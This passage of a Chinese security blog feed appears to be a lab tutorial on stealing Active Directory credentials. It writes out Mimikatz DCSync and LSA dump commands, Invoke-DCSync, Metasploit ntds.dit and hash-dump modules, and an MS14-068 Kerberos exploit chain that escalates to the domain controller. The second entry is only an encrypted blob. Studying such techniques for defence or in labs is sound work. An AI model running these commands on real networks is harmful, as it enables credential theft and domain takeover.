class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:de1ay.com /user:de1ay<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210609193652451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也可以直接在域控制器中运行Mimikatz，通过转储lsass.exe进程对散列值进行Dump操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">privilege::debug<br>lsadump::lsa /inject<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210609194346493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>使用dcsync获取账号和域散列值</strong><br>Invoke-DCSync.ps1可以利用dcsync直接读取ntds.dit，以获取域账号和域散列值</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Invoke-DCSync -PWDumpFormat<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210609201159461.png" alt="在这里插入图片描述"></p><p>项目地址：<a href="https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1">https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1</a></p><h2 id="使用msf获取域散列值"><a href="#使用msf获取域散列值" class="headerlink" title="使用msf获取域散列值"></a>使用msf获取域散列值</h2><ul><li><p><strong>psexec_ntdsgrad</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/admin/smb/psexec_ntdsgrad<br></code></pre></td></tr></table></figure><p>设置好参数后运行即可，会将ntds.dit和SYSTEM项复制并传送到&#x2F;root&#x2F;.msf4&#x2F;loot&#x2F;文件夹下<br>拿到两个文件后就可以用工具进行解密了</p></li><li><p><strong>基于msf会话获取域账号和散列值</strong><br>比如已经获取到一个会话了<br>然后使用</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use windows/gather/credentials/domain_hashdump<br></code></pre></td></tr></table></figure><p>就会导出域中的全部hash值</p><ul><li><strong>ms14-068漏洞</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/admin/kerberos/ms14_068_kerberos_checksum<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210609222924824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>接下来进行格式转换,msf不支持bin文件导出，所以要用mimikatz文件进行格式转换.在mimikatz输入命令,导出kirbi格式文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::clist <span class="hljs-string">&quot;20210609221820_default_192.168.43.16_windows.kerberos_125881.bin&quot;</span> /export<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210609222904133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>比如现在有一个低权限shell<br><img src="https://img-blog.csdnimg.cn/20210609223517247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入 load kiwi 命令,然后输入”kerberos_ticket_use   &#x2F;root&#x2F;<a href="mailto:&#48;&#45;&#48;&#x30;&#48;&#x30;&#x30;&#x30;&#48;&#48;&#45;&#100;&#101;&#49;&#x61;&#121;&#x40;&#107;&#x72;&#98;&#x74;&#x67;&#x74;&#x2d;&#68;&#69;&#49;&#x41;&#x59;&#46;&#67;&#x4f;&#x4d;&#x2e;&#x6b;&#x69;&#114;&#x62;&#105;">&#48;&#45;&#48;&#x30;&#48;&#x30;&#x30;&#x30;&#48;&#48;&#45;&#100;&#101;&#49;&#x61;&#121;&#x40;&#107;&#x72;&#98;&#x74;&#x67;&#x74;&#x2d;&#68;&#69;&#49;&#x41;&#x59;&#46;&#67;&#x4f;&#x4d;&#x2e;&#x6b;&#x69;&#114;&#x62;&#105;</a>“命令，将票据导入，接着输入 background命令，切换到meterpreter后台,使用高票据进行测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/local/current_user_psexec<br><span class="hljs-built_in">set</span> technique psh<br><span class="hljs-built_in">set</span> rhosts DC.de1ay.com<br><span class="hljs-built_in">set</span> session 1<br></code></pre></td></tr></table></figure><p>就会得到高权限</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>域控制器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>openssl流量加密</title>
    <link href="/2022/06/15/openssl%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/openssl%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/"/>
    <url>/2022/06/15/openssl%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/openssl%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="ece239375e8bf5f54079ed16021dc95b3a5f047b615852e6864c7201ecdff56e">2713301b30d54682598aa2e6ff3844e0606ed2b0202c15f993f77c2d635b2b9697e7c2bb79c1556a0e6650f7604f5b8694a58a1470d7c67c37ed0aa4baaa6bb894f40e6d05230426e05ca013d614f38bb45c8fa095b88ab9a71a82f444812adc851a6fcf8d08483f67ab6bd402a99d99fe5c6ae67ff4b294b81f7fdfd8e90b5b0d4bea9582bd66c22eb511925ce2c51ab4c4fbf3078ab2fee5d08f934941260437c12e4bcef4aedca0f77de98cd0f6565e6adfddaa4cfc1488972f158292cf1a5f98787fb67b7f5dca1f5d24b1b799b8e4ca308b4ba86ec9903f6d44c8c7ad5b19d490cd43d28b9d2ae68ce96c8d1b647c1c4bcbd479df631a1483e5e55420085563a262a35a51defa9a834b7d22b39c91d31e642fd8c73b29cf76253b4cacbcc799ab5e9bb6438a0309dd4e21c2eae4f80acff5b26e3e2e6f9e8ac5fb55b8315b226793630741fe2e1d4d64b52bc324b74cb4eca14a9b7847f1eb2f2ff38beff050a5bd6f7b6e2ac570ade2a72595cf99e3964be50164f0c38bc827924ec45da1c8b4f213d803999a09619ca8f91a056568202875d2ce3079a0ff89cf4d3b1177d498076556a80de1fb9256d8a0360c18207280190813bcdfafdf95819285bcfbc8d03d378a7fd310b48dfd56f408c2d2a83c3625fb3aa22f49f4b7b915937e2925d618e429c0772701e32db1cdf3b9040ac6d1d52c9e1145da736868e28e62a4991a2ffb925c3b73544438bd0282debc834d4c5ea005368443a5a80581ebda9a4e9b7c9f39b0d56c29be91423eb8762b749762c6e0707cb7ed29693fb6d24872b1ba243c232f154efc586fea38eb045dfbe2e2cecc69b12de5f1b8c7f95d5d5e2b6cfb832f4ae554d77da9f1230b86b9df388a039282b8e769c9f0b8a47e5b5105ebb4605aff4541ae701b17e7f874e0c34dfc66b267295bb3d9ea4b9d1fc5a83cecf8b8fda653f1163301a422d8e7368a864827b8b35595a01264d841d99d43333da8e514b61f5c3d5a2dbe324dd6c3a581b8b4fc46a5db810f2a866894ce746f7823b798b2de59591413d1012fc594d5da54dcb2ddfae0887be8f20e0a06239beeca328bd772af9caa6d2ef8e34c0a8124be361f69be814d64e23aee0f051b99d9f07ebbab928595c49d020b3e4238b83b7e2d4dc4f52b481961b4c106f5afcd6c2f75d93d8b202a297bf4d3727477c4da18d38b509d486491b2da9986c0df0d1028f47c154063e69c02bada9050a3e76cf3c59da9b374221430b32d3a05a215232f2b8290c1503f3b05c5b7fc632b9c4d39357203891f83420032502fd3dd3c2edad65a65597c0a724f73b92d496075ca7b671230d65c934bed2cb81859f5ee7f88b737d1a085c41affd5c5de0a2d7e9a3ee720e0d91fb1f2f98b6ce910913cd7bc054d27f64ce5a53e36bbe4f13ae89d3f19478152ee696dcbd0182526ce27cb69d8123d3152ecdd3a1c11a8ebc031b30b034b395c414c2147a431122ff9348bd8776ec4522749678038d1e60ef844774b5c48bae7912eb83013cb579c2f9828f34e8cea6a9e16d89c730d3a67a2258472b3fc498e0a409d82e2b4eda0b127ca50dc6b6bd65fbad5e0e6d6312a64939b75cafcba2bf599f014744213118e0cad62c319f2201c475da691b790a48bad20f9299f44497141e3412fc3b3c6e0d6f9791ce8d0aa3ffce4c8b477994ee2cf41dec532cfa91ed6ff9a3e15e5f57523ea4376a27e2fbce595ad0119d4df08d66e2cd5037fcc41d8a456b42d4481fb613c8b0fc1f28cc57798bb761ee76ed5e44561ae155c425eaec2b9425edaaa731534a0ded87f75daae6adb213a313e8d2fdb957f70e6e586f6dc636e651abf2023bb6e8fc6d508b5c62b53c0b4e492fb91f229188e33c502f45c5ce838dd3078e2169ccfdb85894de85f9cb6757b51594c38a5c61c59e9f5e982a8e17bf55864b2272c54a4f59fa4ee1535ec3f34226891a0090119ca57b80e8dd72afbec48e0564eec1bd546c986440e318ae8e321b000b10379a086719fb0ca9408add76d5b9b1ef4b2d7bb3db7033caf010eff3b4c977936d45a92c91c93ef23bcc7d028a0589713484ca191bf44ad951477ae9daba23167344d601fc8ac866f42af0b443bb8e2893dac96da4560092fab30c79c93dfa6e8520dd614939306658baef6b8ff116f945c35debbfb02b15af80112d7f264ad885e923473bcc8de2baf5925b3e11afc1033b2e38f31f6cf0b40ef464fefbe3037d179d66603d0195bb650217995c70614b88537dcda27e486c7e02777dc3f4b95e7c514794521b537a71258a1b32986c0cb88b80613dc04805da1addcabf6d2b0b6d399236d90ad444621531e529b79e89253479aede72f26f5f35161e2d4af7efbd4d021c3ac69fc3e7ea075b979fa6bd40a33c24bc7294a5435eddadceac8d6c69a0b3a2b131f2d1ca5388aa3f927061e7bf8b659053e8ee51eaa8ac87a9aadc8534e9664a9d878261abfe44864c6c005eaeecdd24ee81c8c366db26046d57282a9daffb7fb717950b5186b249d0256429d95c0e82ff952874b5984b5d858bf915100a484130fbec41c329bd614fbd73cf76f73772dedfe6e176d60638ec16761a7ba2336e9c4571fc886c79eece5b8371a25b5bde1dcdf4fdd9255eb8f76e4c31bb3e598f8c73cc70f8bfe6f20a583de63b454371c5b9fe5db904123ce247204c1e853f6175361972a815ff18737d3a6ba4486795ad9b5c0263a58df25f3581013eb13579744bfd558bc6730719796ee9d65dd1c98a55f1501a9c31ba41bce6019f3618a769fc345bc2be5773664b16e74005a7593e8354e2e7e9623a71bdc4c217173dd93f36d8dbcca551f576662ce3b0be70ce9baf7850759356d29cf8ee7e28bce7618cdbeb7c8987fb8d033fed2b98316252639119d2992dd7c5802daeae4ee0544a58f7a1095dc845b005ec3f179538483835db4d3b85944c04208277aadeea32711b395d7dcdcaaeaaf0d0a846b63558bb16487edcd859232b07ee68f9835edb2bb9ec1775e53b107b3b176e78f560ea0c169dbc71d2e3978c751dd6447406da301372679ed12328d348c9235014357a7a2999d551ab7a4bb4811f0dbac1d4bdb25508467be1c1f5a4e7f738eb928015794050185c034107c230a0c33c79ed342b2ecb71246ae2feedef194d366fbd47f6f7e09813492cd18988601e3158f8d928aab023cf90af44b84768e8b5b7fdd23ff8585cc1a2f71c308d25d8d05079a3d1ef398808321efcc1674c36983ffd39212a317f2ef222be87e10da2b952633611562af1823f9c8acc394dfe81d80c315595c285f8b194ea780074922e4280c967ec9564bcae3f323ebd840f05c01281d1f5a574c294b02887b73e61a4b67a5d4b32e3ebffc8ec6e4dd7a3d0cb6ea35955f981843d2e63b2c339504e23d368f228efef1b7f78f4f7a9f3e09a7ba1f080c2fbf4d9c17275e94e2994e684c4f2aa700388f3774c6f234cffae336041a2c8df597b2b1b31cf668185e1ecf11f9cd1fcf11593c005019ae58bad64f6ef8ae1bb838c2abfa5c56bbddc02e34c3426389d07f0c4bcc62932b2ade95116de3703d63c693404525f49c15f163d45b4d241784409f6e826f05bcb6134616309c30350be18ed43788f8b9098c1a5a8a5fc6063267bb924681b2a6b82935abc1361045543c8ae628f75a387d608aa3ddb5141f25502feee29e1bd7c46e4a6198c110c8aee3445262e5bba472b6f0a77c1235b8ee9dfa54dfa798b441c2a1c6e9fb68414dd26ee7cb03db70c7ac1158b6791bb22d71592544dbea67a4b955477b8cb5e7a0651efff0e3e4d073734016d6cdda518050088e15c38985823d64abf47202dbb451c27a2a7d2185eb15f960b0a4b559b774d16c285a6c764d65eafd34d264ac6fc2ff207762f20e9d7bc630f05851f8306b906a494f8a0e33ff2b6c31cd277161f48354fd5e8cf827972586b80ded41908d3f0c21de42822326a83a716461203a186f145e085738fc1ebd715d15a37e957213fa458c280d63a4dfa8fc86ed9d8b2806f6b86c97b744f7d8b8df5b665cc215fbb89391b2ffa74070a86b58017541d8d006f0dfb784b19adcd4c958334ac499db45f11815c77de712c00c9a113fc8b3cf9df0968714e4772a4212eb70f2cd377dc1b2277499ed0b16e63dccadb77ea5e545ac436792c0f68c686dbe30950c8bdfae9c7b051d8851f5f3b4f6e0c7564ac07edfc4fa64a4eeb68fa856ceefe027636166faf89f4e2d1e20e32edb85b0d505f7efe64623f6699aabb579084ba4a2dda7806c00457f23216cb1459416c7d1f6912fab027ff090e0ef96a1d7bd44206c6efba8ad0893feb3b433f0ec72cc5797dabd03e4fdb08c77722aa85dcc98d410850e1a7e6c1701673a450ba2848d449a7914dd6f6f99569b9ab0e2fae37d717c883f2948daa0da6300760f8180c460ff529f899337af1353885bb7a131dfd6a76f24cc09ac745dee2d9fcc422b382991dd6c1f25073d1c952a306d2731218b5fb4e940060bf99141a7e483c59aa55ea3149b134d17dd7f56ea999e712e122e6f9a4f5f09929596b1799d540ac73b67612fe126373b30d6cc478ba23f8342fc934f17e101690d5880222d2148be1790e8e360c4313343545be86fe6817aabd47af0c39542d7e55d68d799ddf63c2aea1dfa4d92fab09d7924360e34d7829b7e183c3fddac38d52842f63ef7a4bc16de4ef27be16809922e57fe2d0c4fb458a684ed843fce5493c7f3cb9e237b1f4bd5e9ab94ec7f7434d416bc86984ec7feffbdcce18c836146c0353f9193a118ee3d0b27199fc795ef7e8407608d11a47cf6536a9648d353452ec30a3abdbacd9046468e0878497e2d8b052ac62809cee3841900935320a8f6d1eb22d9704d980dbcd7ba0d3537939793fca4ff267c72c979e6a16a0ac4fdae0b4134647fa50dbe31df6fd707645e72ea75a564a4af22d5afc341093f0307e8fe158e22c151b67f6ac0d78f0eafdc5c707bf5e463ebb73d1c922067bfe3b1126abd633d06c277f43c75347701332ea94558836256e21a95ffc389f09414f9f20c3d0ba91357650df600bccc683d872be1aab15acaa56ba7815efe4f7298e4fdd3ea5776b4f6701841f1506b16096dd60da2a5e7bad6c6e6cb85a91f1653c29713306c670ed633b534a2af33fcd0f19ce0a6dd50bd66874fd8d40efae6f23097b49af4e59158479d587a9868245f0a5af537a8d42100bce4e14528d46e030e7b10829b81d1b5b6f9cb4d5d76514cff9b5bc2853457deec20b4ea29cd5d2135924db8b749291971153fc6fdcbbcb9e243ab834802ced77b3a868bbfc8a1c35d132238201717cbd6d8079f2fcf32cdf163d091b0722abe262d3650901f23296d40fcb074b0a7ab23214d09ebf013bdbc20e5e9262e9bf57dc325f90bbc3c1c7142cae7c560841aab3969876b0195a864f7def1c5eb23d0e932241dbd7ed7f5b7e25131e14f4a122f6faad01a03a40564aa453240869995303e6a1c36a8621912dd9a2aec52dcfbd8afe692ddfb3cd634d88379ae744772583bd7013004c59494cc6d3de4cde39c594f835341bd1010a81dbd897313771aaa7d537c91ede60e5d30d454c9bc46e0e310e8996374d7b294403fe30b75db0883df0399a7d0aa68f4ba4c94b26e9e0911c94ef5c6cd00354784dd6fff7c2357b11c5b0d86d0aa59924c955cafbb99afd6e8eb06ce0c57075a6d2253d81ac7d0a69b1693b7693a25823f4ab6d2a795e6f35bdb2533ebfe0144b744a3b62c6e9c8e35cd26d45f71135885a9fb4d231a471d5fedb78ba03bddb12295571b71b36ec610c99c4744f863fdffda792407bfca67ab71387c3f6e9c0eaf5a3cdb89001b85c2f23778391597be8258fb78844f1db9f517348a7d2983ba39b73cc6c72467f626b15fe09bb0f9ebbd55e73f371b321c98267b5613b082d8973a5496b6ecbeb0bc34b9d28733b7648564cc1373d53a9bf932a511d9dc03d5659fa1925babd1e7075ed24a6d2ee76b197d9432b7bf018210e301d497b708ff5fb4b354f0cdc9309cec3dad3905a68eca9978ef7feaaf29075731fc0fafe4ceaf1df55a300c6d4c0f0b66cb23056a421267744bfe878ad8e8516c439dce0d6af5961857dbf03a4ce88cff4eca05bf203bb229cea9b375d736b36b9cb8908c336535b70bb0658bbf56b166d0054126d59d385997dd8018053dfbf56f4318f2ec839c4ff4ab7224bf0d7e3ebe1ae8498750d1cd8ba35cc338aba076dc7475fd6b987ae46a324aed1d84b4ae17b0974f7f87f62e278e7906622f1fbfafcfa803e91d15621885d162b70d579507d311253222c06b29e08fe5893f7fe2b2136c8d6373afe5a643fd83078a3a1ea49c9fc744775ec450173feeb688e1732ac2ac65906a7a01fe0820c18c9ff974d377b66f319e0054c1250e879625a418ee9c4a92e2f652d25f9d5fc20237800c30e9f9e236a36ec879d3592c942e287998d1494e86634a58ddc5ff62e98f10a39f4f5f26a58f371148040e9705147beee11e522c5f662b521279ce8e2f93f322fbcadde25ed87362314d51b24192c17e0c4cb5ba2f051b78f72e2d670372e29de39239b6981c2cdd36a11edc53847c69d8a6452453ed1cf919a71b747e0b49a335b55ae8d7b689204bc5165c8a8759a5cdcc81c377118654a606b93eb643c99fd0681f17dbd5397a2423784b2fdf0e1c3439496fcff9e3b3c54d40cd1f579c2a342f406ec6bfe60a7c4d7138079c9f812d8b26415c9aedabde0d456389ac192b13ec58ecf4350dd077fd0c0eb0c90f8616030d60ec6f27d22c144b84d314bf98004f19e3d0d8e10e1d5ef7ccd7d7d28b3d0b63b57af5858b13134157f129d5276036123acb40481f93d44681d6a77057916c5fc6daee77d26209fd03b46cfd1e4a330a3a1947a4e59c02f92985f5b20c0e515401fdf2866a23f7f7996cf1fc44087056dc7bb40dc1c51a47215df756ac96205e51343fba19fd63b7fc3035b1fe6950e99852d824888312201519ad9f80a87bc9bc2b30b3c2c75121da77d755f54b2a60912932519e40444178a28abb8f46bba1bd03a304b61294e80e39f08770d87546f3b000111d6df833271bb71328d8c19379f511fe045473e5ea6f2be4aae96f2a653fce1f9aa54c988651dd5709346da508d141d454a9e3563e969444f146868e28d02a07510ecf761d78666fcb6501f0ad2ca1e787e39cd4347e252cc32b6b4970b890d94af19950ab5266f4bc102ee9b21fb537af430b69386047ec4a9f0ac053d49d028d9fdc1ade1de2104c8658c925cfa9eed43ded845673fc74fbf3d4029af3273756840a6b1a04cb993714c47107665f0f09b99ecf0a7b25d87bebfbd698afb62218700e2a3a78c9f1b5aba2755bffa596a99cf85d51c79b3adeab763d66ab31e2a1eca941952a0e119458672d763d246da48c9c2c350d07c2d570e426d259552b5ca351c311ad533aa09ace9bd99edf7082cb32c9aa86f7b7273ce4cd7222eebc0d7b74bb6d1d68714f5e6af128035bd6b5aaf532668e2a910236bf7fd298c97b70ead5959e52d380d43ebe9d6d875691efcc3baa80ef5ca39870c4a7e51105565e3ff0e24425dd66be0462c56a20767c91b3a232cd3f7c69e4b69eb03202ba30e7c18428c7eb98f5997f22e0dc74ab355fdedc591e04353e3e07a5658acdfe5e8e53415e9f65609a2751934e8e0106878159071d98d2c57323574ec3bc6e0bb84863be474f6f5d0f4ea3f8ed1fa4dc7ce3c1ba157adb6114489996b38de2370202428596d602ac3877a16376df6b480a12dc7595c13748178737cfd985939016eba5e1894bb75c6c0915687cf2fad9b92dc9ec714f0a8a27a2890d837eb805bd19950b30dd1b80b3bc35920d95f1e25383726401436579db0a93b47810592091a4f01cead1caa4e16d55d95ec297600516fa8abd21253182d892186ae6c9eefa5fb4cbda7b2e4539d26a301552ca698e7777864f0e970fd82094424156c2660f08fcce4c123cb25b2573cf7a9435b612425489cc1527bbcdb36b2ab08f65ddd619303f1c33b2806d052054d76552e228e403eea51e56fabc9b103ae9bc65cb0fd44bbb2abd410a37a2f15f002b0a8b302e537781825e4dc0dfeeb46cbd054379bf533a8feba2abf8f8de2242af4da499ef55b3ee2feb6c3e668859444929eb745458544ef9d70548c5ec53123bc68e54cbd885a85c5df31cf93c075a031422b5e80eefa2259fdc2f632fe1d428517254a4df2a23f7537dbffbb572f7dcc4cee2e98dcd12f1516d88768fcadd1fa6c87e2c6f7ed2ff657480140b553d4a04e4240dfaa46683306c8ef18a594f8d1e6c7678de007b5f0ae5d73b5effffd8639c4868c6f5d485977ba7469ddc5c7800f66f6a1690c97cad198f36b18845dc9751e37d8715868182390714c392e6fe7dc4a0cf83e5ae4cca84745c023c0668389c03b1d0ac0401cd97698a81d6cf7bd0f43882ffd11e4d4853c6a316b0444671ef4d82342da610f71a012da595de5a1f0922454471466821bd1f595296528cff927438ec7a8a6234f7834006f667e4522f9604304341d5f93765095989d6561a293fb2c27ff11fafa650ddeac0555b8fabce490535771aa440001ae32195db5880a147fa32fdcda0dfe249c872999ef1aedf8bb2187c5a5d37f18f0e5fb5a3f2fec2dfe02502bad1b5babe314974b1af5e8f867a30f2ee8c11168504bdca6168ffeb8b02c2bc88d9978fa62aff5ebcd07da4e4ce655acdb12f62c93b64a1153f5f6fdecea55228e0b6784eb498cb1f18ac5495ff95bb73ce928ac6df8fb4756d7e8e563ecf70570d320086641a71cd5db107695e0a6610470148fd7358f09017e26438ae2640393c65abed32f0cb5f14ac0d8fdc4072622997d2edb5b6042d6d0bfc3bb78dff00d735b17c92ccf7b7459c4bb22edb0453d7e74cf5eb69b17ef7cca909a146f86ca06ce3d1959d9b8a158f2b0c5cf9362e70efd665afec3d88168d8e1465cedd2b760ef09a1a9b2209cc013d29c6343507bd04c8bd36bcaae3931b177b4ac657503758d071cea718f28e26e7ebe3ae202d81738706cbf5c5266720b076e9f8714570ff98ac9ad9ee25a812dce970ba0ae06eaf1fb3aceeeae7a7d7c0825f1b140740aaa29b1392007c6603386bbf231c8218140a542f2953a411274f79f154aad48318595b02793c16fe022dc57dac6258347f51f7fa754414ae31d944770e6e160a95610aa1d5e369b9f194a365fd7b8ff449e208abd2c7ce1cc89adb392744a4fc57c562687f48607bfade3bf0cafbd8451a5cecc7f0d2cd77f95b18f9a1603a3b9bd81d69306e84de7a8cff8641541a2f0672c815770fd3a41e2d09f1055af43c17dc35d1501dcb943b3baa2c47f29f15c2dad7db83c36c7319e81fd2f99d02f961e0d875c4b5277cb12621b3d133356c2b552346f2a1688bdf99770ceecb9819b5bf37c0ac2a5e58171e9e4185616de11c9fddd6e64f2b23668082cbce30e906352f50fc2d06bd53dde4503b337eb18cb5b5ce73b70f15be2992dd3c39d2dd275d72fed68fcbe4994a6970dc189857bb96483c3e39747314f0b2ccde9191c5adc47badc3cce4c751af542cbeb2e63fbd8e0c85613b20f5d254d64cacad5355626aca070d11633345472f1f21e75e8e092d7599e7fbcaebdfa5ae514cd4a55891c7f51a1dda1bd286b2f8f9bd4ace869d71be466532b450c938554e685fb272b4def9139269a5cd825f1ad697b8b2b9a130cda84ea26bf91f00b662e76e722b5b43abe6be9f8deccff9ebd6da91cc48ae21e081f347139aecf67ec1d6ef56850c5d88a1114d395aa4737c03bb4c2ad695ddca029aa4162f8d0835099c3a03631a8d6970bf47283ba14ef5d9b056003f4c5ae0fb2fb0427afed7a7cf2f3ab1f4772b8729c12bbcb51a192bc81cf6ee6f19b6eb6b35a54fc0ddc1873c3d5434584ba28a6d5cf8e3095e362fd15f551dee65b9d0810a11342cf3829903fd2a6feae232babb9f1067919ba88b01ecfb83fcf627b6bb038860da3feb2a49eb11112ef6e8d5d13ee24b1373b6af06fb64954bf9dddcf1273f87d0483e2983d0d3562ccad69e3239cb90dd8165cb69925a427e5cfb86cb331db08c59e98753183ef78f070d423d1704b83d05090220658f4e9d187e99689c999d03ac754cd104d9955354ddfe0a608cc4ad81be099c9e02c8e2a33fd17d56cb3612657cbab9b5da49442fbc7dece85f4c328a9acc9188072dd638db1dbe29535bbc820f22859b02836273e6772b41f36b8579efe2ed4a06921591a5a4d2d29c5f5ba072f8e749c174be0c39e5b6a75655bc9209cf8a1145de7dee49a3c0891701a66212df16e4e56f1d90744dc54baa51cec310c5086a2c6b7397481601f882315b42bbea9b745a4d302393fad128fd5ea7ec69605693d2750e372876d1df82c8300da5f2ee50a78333805cb3815d9d31fa28ed0523355662fab8b64a28681c1aa49a8373c03d42d0b8eeb3e631916f649a7e41cfe577fc8ae8bb095cc032e1a1166c684be159943046731e1b0ac18d00162c9941374e299be23a6201baca25501655d04d21afc94f730801603db13e3c863cd36e0e72da647baba9945485f1a73d0af9402d310a4efd3fce3ea44375887558851371219620e0144ad842389315de38bc0c7d72401b3aecd024d06ddf04d933462daecc20c8107cf566099cb987a37b53eca7db9e0a7d1b6fa5d5f6937f52212f599255139a40dcd021a55e4998909fa40322ee7679b55a45de1ccf67a5727377af703d1b37c6699c4cbdccb3753428c1da1cfbfcd343aca623b0956197e4611902d073ef308360cf3c73b923330f7dec8aa5d0dd10ef52e61f9ab93c8dfd81147e60763515c5ad7c0464eb33fe2c57882eb84c23f281b78eb9eb200a4a1c185539cbc32678c5f756b19a5d462b26753e0ce4f5704117cba96b5328f82a957a9b6d7a7385f8b8d1cebb57e791c9379ad22263ff67bd4bebac9f7356d8f99f1a968e252b7e3b3bcdfb26f39e912b4d04786b0bfbaebb3d9ad567f7960cbddd951bc0ff2ce9dddd309a0ec13a417ac7ac34c2f4fef6608fe24c9c21c851ae6e141e3555b922210bb99f51c796c7ed5a672d74b58d2e4c03831aa3fe8d89f880c6f4d303f788a6fa1a153eb0b9a768c7463ef13276b5c6c9478cafdf42543e1d8b79c500845b760392d12671f9a063f640abc7282a0d6d9482746d1d78918be57ccc214c17fdf3f930f362d3d9b49e2f7461cfd4a762405d37eb502320e744d32a7ef9c70590b48419ba618324e8b3cd43498a1098d5a4c18c5f05d681daef046a50f5dddf45caaa9789c761a88f25971f7ae501db277d29b9212ba48692207d736c193e634828fbcf931d31f76d7f8a3c682506dc5511e341d321477c2a9064a2799a3a731899dbbdc6f42b2efa36f78de194ac836decbc6a509e30f3bd918a8e3e52e02c8ebaff3d297c708170c4566a551bb5a215cdb38105b7dff49af51698622bc8c71508b08e9d3266f04918d7e07c97b1635f047432fa5794b6eea4b06c6557ea189d530a968f8d8f38eccbeb8ffd32eb232c0541e8ead0dc080053d0174ae588366780f619b0cb5856ce3bd69c59f25603c26523e82a93059e3e96cfc4d5256a98e7e8337b35b9cda8599c4d542fbc49145266e8e26d4b1a4492c54d440a9ff19372aa2ed81f0ac6a889c6868c7ddf4e31300ca371b8d5853a09ec4b881c9835509128cf030b79ffce9011c288b8fd02c96ff84e3321be6871b8d76d2a64b937f6ae5c0f2c0201c95eff4e387296956163d0970e41f3d38c43c3abd626182556b202d54e41d696d4cc11cee9f454e4613e3a14cac5f2ba4c05c905fb70cf0e598fd070b02f9ba243f74cc2c16704eae4564c096b7afbc171ea4648443264b58ada5e634e7b0089a9d928976f195372fbf08647e0640bc0b3339798a86228142402cd5f45da0132c7603d24a2f1bfbb6ba44bc20ca6fbcafcd36f3bd4b6f09fb467e094457be74e6c4a4627699e1076d77b66da11e934c0d580b9b55eb0940213098376d9ac6769251edb969618c40bbaa7d4790095a7e8459b4646e1337a3b05e09b51416a83fd601c005f8c9c37fd855043adba533bc63db4651da23ba1756f49b36f6ca2290631d8ab11b40e62d29539cda675308e57b7f5dcb103716e962e66776d6bde42e5487d65bbdf5f5939cc8345040dfc640b8d206046124fdf05c10b12f904582225e7f31eb955212dcb195ae6834d76c5cd582f6b5f362c976c9945955b8c7ce1f0e72fba2f85d9db61f884f1c4b96635490f5dc2bd23b81544201f3cf0a4f1ee009c8dd8453880a97cfd43b580a211e343cc12c04aa8b478d45ce71102268490dd83cb9f703ddd696d4fd8b67177c3542ed2c5879aa26072032b96e1a1773561cb073f93ea5448aa4d311070e87f8da819ecf0a66d0d27a5d0eb2b3b5bba7161cb8736f46eaf35fe1e7416ef4b2948e13fd406cd2078077f6bc03c76dd7403825cfe9eedfcbac8851bfce5e675909c82e4ff28ffe305d83fe595b76f1347c4adb4dfaf8e30d9e16a6e4c24bee5cf6c1316b8ccf5345ca13046d77a6db8affaf125af86511dad64743d20b6db245253f02a169eda7583bd81a65586162bad9c0f8f8f929804d3c8e26b6799db6602972884a3353cfbd11c6750cc5d90a041d6d59fc0cdeb933ba78d9a0776d4b522fd023e310ff6ffeab8070f4338333b5